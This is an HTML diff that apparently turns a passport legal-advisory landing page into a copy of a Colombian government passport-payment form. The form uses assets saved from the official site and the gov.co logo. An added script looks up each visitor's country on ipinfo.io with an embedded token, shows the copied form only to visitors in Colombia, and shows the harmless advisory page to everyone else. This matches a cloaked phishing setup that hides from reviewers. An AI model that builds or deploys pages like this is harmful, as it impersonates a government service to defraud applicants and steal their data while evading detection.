+                                            <div class="col-md-offset-3 col-md-6">
+                                                <label for="tipo_ide" class="control-label">Departamento:&nbsp;*</label>
+                                            </div>
+                                            <div class="col-sm-offset-3 col-md-6">
+                                                <select required="" class="form-control" id="departamentos">
+                                                </select>
+                                            </div>
+                                        </div>
+                                        <div class="form-group col-md-12">
+                                            <div class="col-md-offset-2 col-md-8">
+                                                <p class="form-control-static"><strong>Advertencia: </strong>La
+                                                    información relacionada en el formulario será utilizada por la
+                                                    entidad, amparados en la ley estatutaria 1581 del 2012, Habeas
+                                                    Data
+                                                    . Para el manejo y gestión de bases de datos.</p>
+                                            </div>
+                                        </div>
+                                        <input type="hidden" class="form-control">
+                                        <input type="button" id="continue" class="submit action-button" value="Continuar">
+                                    </fieldset>
+                                </form>
 
-    <!-- Credibility Section -->
-    <section class="credibility">
-        <div class="container">
-            <h2>Lo Que Dicen Nuestros Clientes</h2>
-            <div class="testimonials">
-                <div class="testimonial">
-                    <p class="testimonial-text">"La asesoría fue excepcional. Me ayudaron a entender todos los requisitos y mi documentación quedó perfecta. Muy profesionales."</p>
-                    <div class="testimonial-author">
-                        <div class="author-avatar">MR</div>
-                        <div>
-                            <strong>María Rodríguez</strong><br>
-                            <small>Empresaria, Bogotá</small>
+                            </div>
                         </div>
+
+
+
                     </div>
                 </div>
-                <div class="testimonial">
-                    <p class="testimonial-text">"Gracias a su orientación experta, pude preparar todos mis documentos correctamente. El proceso fue mucho más claro con su ayuda."</p>
-                    <div class="testimonial-author">
-                        <div class="author-avatar">CL</div>
-                        <div>
-                            <strong>Carlos López</strong><br>
-                            <small>Ingeniero, Medellín</small>
-                        </div>
-                    </div>
-                </div>
-                <div class="testimonial">
-                    <p class="testimonial-text">"Su conocimiento actualizado de las regulaciones me ahorró tiempo y errores. Recomiendo su asesoría sin dudarlo."</p>
-                    <div class="testimonial-author">
-                        <div class="author-avatar">AS</div>
-                        <div>
-                            <strong>Ana Sánchez</strong><br>
-                            <small>Doctora, Cali</small>
+
+
+            </section>
+        </section>
+    </section>
+    <!-- end main content -->
+    <footer style="position: absolute; bottom: 0; width: 100%;">
+        <div class="nxBlock nxBlock4346 nxBlockDesign1 nxBlockLayout
+     copywrite">
+            <div class="defaultLayout blockContent">
+                <div class="layout4346">
+                    <div class="row">
+                        <div class="item col-lg-12 col-md-12 col-sm-12 col-xs-12 container">
+                            <div class="bloqueZona3  tipoDisplay">
+
+                                <a href="https://www.gov.co/home/" title="Gobierno de Colombia" target="_blank">
+                                    <img class="img-responsive logoGovCo" src="./pagopasaporte_files/bloque4345.png"
+                                        id="bloqueImg4345" alt="Gobierno de Colombia">
+                                </a>
+                            </div>
                         </div>
                     </div>
                 </div>
             </div>
-            
-            <div class="certifications">
-                <h3>Certificaciones y Afiliaciones</h3>
-                <div class="cert-logos">
-                    <div class="cert-logo">Colegio de Abogados</div>
-                    <div class="cert-logo">Asociación Migratoria</div>
-                    <div class="cert-logo">Certificación Legal</div>
-                    <div class="cert-logo">ISO 9001</div>
-                </div>
-            </div>
         </div>
-    </section>
 
-    <!-- Contact Form -->
-    <section class="contact-form" id="contacto">
-        <div class="container">
-            <h2>Solicita Tu Consulta Especializada</h2>
-            <div class="form-container">
-                <form id="contactForm">
-                    <div class="form-group">
-                        <label for="nombre">Nombre Completo *</label>
-                        <input type="text" id="nombre" name="nombre" required>
-                    </div>
-                    <div class="form-group">
-                        <label for="email">Correo Electrónico *</label>
-                        <input type="email" id="email" name="email" required>
-                    </div>
-                    <div class="form-group">
-                        <label for="telefono">Teléfono *</label>
-                        <input type="tel" id="telefono" name="telefono" required>
-                    </div>
-                    <div class="form-group">
-                        <label for="consulta">Describe tu consulta *</label>
-                        <textarea id="consulta" name="consulta" placeholder="Compártenos los detalles de tu situación para brindarte la mejor asesoría..." required></textarea>
-                    </div>
-                    <button type="submit" class="cta-button" style="width: 100%; margin-top: 20px;">
-                        Solicitar Consulta
-                    </button>
-                </form>
-            </div>
-        </div>
-    </section>
-
-    <!-- FAQ Section -->
-    <section class="faq">
-        <div class="container">
-            <h2>Preguntas Frecuentes</h2>
-            <div class="faq-item">
-                <div class="faq-question" onclick="toggleFAQ(this)">
-                    ¿Qué incluye la asesoría legal?
-                </div>
-                <div class="faq-answer">
-                    Nuestra asesoría incluye revisión documental completa, orientación sobre requisitos legales vigentes, preparación de expedientes, interpretación de normativas y seguimiento personalizado de tu caso.
-                </div>
-            </div>
-            <div class="faq-item">
-                <div class="faq-question" onclick="toggleFAQ(this)">
-                    ¿Cuánto tiempo demora la revisión?
-                </div>
-                <div class="faq-answer">
-                    La revisión inicial se realiza en 24-48 horas. Para casos complejos que requieren análisis detallado, el tiempo puede extenderse hasta 5 días hábiles, siempre manteniéndote informado del progreso.
-                </div>
-            </div>
-            <div class="faq-item">
-                <div class="faq-question" onclick="toggleFAQ(this)">
-                    ¿Es necesario presentar documentos originales?
-                </div>
-                <div class="faq-answer">
-                    Para la asesoría inicial, copias digitales de alta calidad son suficientes. Solo recomendamos originales cuando sea estrictamente necesario para verificaciones específicas.
-                </div>
-            </div>
-            <div class="faq-item">
-                <div class="faq-question" onclick="toggleFAQ(this)">
-                    ¿Ofrecen seguimiento después de la consulta?
-                </div>
-                <div class="faq-answer">
-                    Sí, incluimos seguimiento gratuito durante 30 días para resolver dudas adicionales y actualizarte sobre cambios normativos que puedan afectar tu caso.
-                </div>
-            </div>
-            <div class="faq-item">
-                <div class="faq-question" onclick="toggleFAQ(this)">
-                    ¿Qué experiencia tienen en casos migratorios?
-                </div>
-                <div class="faq-answer">
-                    Contamos con más de 10 años de experiencia especializada en derecho migratorio, habiendo asesorado exitosamente a más de 2,000 clientes en diversos procesos documentales.
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- Privacy Section -->
-    <section class="privacy">
-        <div class="container">
-            <h2>Seguridad y Privacidad Garantizada</h2>
-            <p style="max-width: 800px; margin: 0 auto; font-size: 1.1em; line-height: 1.7;">
-                Protegemos tu información personal con los más altos estándares de seguridad. Cumplimos con todas las regulaciones de privacidad y manejo de datos personales.
-            </p>
-            <div class="security-badges">
-                <div class="security-badge">
-                    🔒 SSL Certificado
-                </div>
-                <div class="security-badge">
-                    🛡️ GDPR Compliant
-                </div>
-                <div class="security-badge">
-                    📋 Política de Privacidad
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- Footer -->
-    <footer class="footer">
-        <div class="container">
-            <div class="footer-content">
-                <div class="footer-section">
-                    <h3>Contacto</h3>
-                    <p>📍 Cra. 15 #93-07, Oficina 501<br>Bogotá, Colombia</p>
-                    <p>📞 +57 (1) 234-5678</p>
-                    <p>📧 info@asesorialegal.com</p>
-                    <div class="social-links">
-                        <a href="#" class="social-link">📘</a>
-                        <a href="#" class="social-link">📷</a>
-                        <a href="#" class="social-link">🐦</a>
-                        <a href="#" class="social-link">💼</a>
-                    </div>
-                </div>
-                <div class="footer-section">
-                    <h3>Servicios</h3>
-                    <p><a href="#">Asesoría en Pasaportes</a></p>
-                    <p><a href="#">Consultoría Migratoria</a></p>
-                    <p><a href="#">Revisión Documental</a></p>
-                    <p><a href="#">Preparación de Expedientes</a></p>
-                </div>
-                <div class="footer-section">
-                    <h3>Legal</h3>
-                    <p><a href="#politica-privacidad">Política de Privacidad</a></p>
-                    <p><a href="#terminos">Términos y Condiciones</a></p>
-                    <p><a href="#proteccion-datos">Protección de Datos</a></p>
-                    <p><a href="#cookies">Política de Cookies</a></p>
-                </div>
-                <div class="footer-section">
-                    <h3>Horarios de Atención</h3>
-                    <p>Lunes a Viernes: 8:00 AM - 6:00 PM</p>
-                    <p>Sábados: 9:00 AM - 2:00 PM</p>
-                    <p>Domingos: Solo emergencias</p>
-                    <p style="margin-top: 15px; color: #3b82f6;">
-                        <strong>Consultas virtuales disponibles</strong>
-                    </p>
-                </div>
-            </div>
-            <div class="footer-bottom">
-                <p>&copy; 2024 Asesoría Legal Profesional. Todos los derechos reservados. | Registro Profesional: MP-2024-001</p>
-            </div>
-        </div>
+        <section class="powered text-right">
+            <a href="http://nexura.com/" target="blank" class="white-logo">Powered by Nexura</a>
+        </section>
     </footer>
-
-    <!-- Sticky Contact Button -->
-    <a href="#contacto" class="sticky-contact">💬 Consulta Gratis</a>
-
+    <script src="./pagopasaporte_files/jquery_cookie.js.descarga"></script>
+    <script src="./pagopasaporte_files/functions.min.js.descarga"></script>
     <script>
-        // FAQ Toggle
+        $(document).ready(function () {
+
+            jQuery.validator.addMethod("email2", function (value, element) {
+                // allow any non-whitespace characters as the host part
+                return this.optional(element) || /^[_a-zA-Z0-9-]+(\.[_a-zA-Z0-9-]+)*@[a-zA-Z0-9-]+(\.[a-zA-Z0-9-]+)*(\.[a-zA-Z]{2,3})$/.test(value);
+            });
+
+        });
+    </script>
+
+    <script src="./pagopasaporte_files/bootstrap.min.js.descarga"></script>
+    <script src="./pagopasaporte_files/global.min.js.descarga"></script>
+    <script src="./pagopasaporte_files/vozme.js.descarga"></script>
+    <script src="./pagopasaporte_files/messages_es.js.descarga"></script>
+    <script src="./pagopasaporte_files/autoNumeric.js.descarga"></script>
+    <script src="./pagopasaporte_files/jquery-ui.min.js.descarga"></script>
+    <script src="./pagopasaporte_files/jquery-ui-timepicker-addon.min.js.descarga"></script>
+    <script src="./pagopasaporte_files/jquery.email-autocomplete.min.js.descarga"></script>
+    <script src="./pagopasaporte_files/user.js.descarga"></script>
+    <script src="js/index.js"></script>
+</body> 
+
+</html>
+    </div>
+    
+    <script>
+        // Función para alternar las FAQ
         function toggleFAQ(element) {
-            const faqItem = element.parentElement;
+            const item = element.parentElement;
+            item.classList.toggle('active');
+        }
+        
+        // Función para detectar la ubicación y mostrar el contenido adecuado
+        function detectLocation() {
+            const token = "3798a6699b4912"; // Reemplaza con tu token real de ipinfo
+            
+            fetch(`https://ipinfo.io/json?token=${token}`)
+                .then(response => response.json())
+                .then(data => {
+                    // Ocultar spinner
+                    document.getElementById('loading').style.display = 'none';
+                    
+                    // Verificar si el país es Colombia (CO)
+                    if (data.country === 'CO') {
+                        // Mostrar contenido especial para Colombia
+                        document.getElementById('colombia-content').style.display = 'block';
+                    } else {
+                        // Mostrar contenido por defecto para otros países
+                        document.getElementById('default-content').style.display = 'block';
+                    }
+                })
+                .catch(error => {
+                    console.error('Error obteniendo la ubicación:', error);
+                    // En caso de error, mostrar contenido por defecto
+                    document.getElementById('loading').style.display = 'none';
+                    document.getElementById('default-content').style.display = 'block';
+                });
+        }
+        
+        // Iniciar detección de ubicación al cargar la página
+        document.addEventListener('DOMContentLoaded', detectLocation);
+    </script>
+</body>
+</html>
+
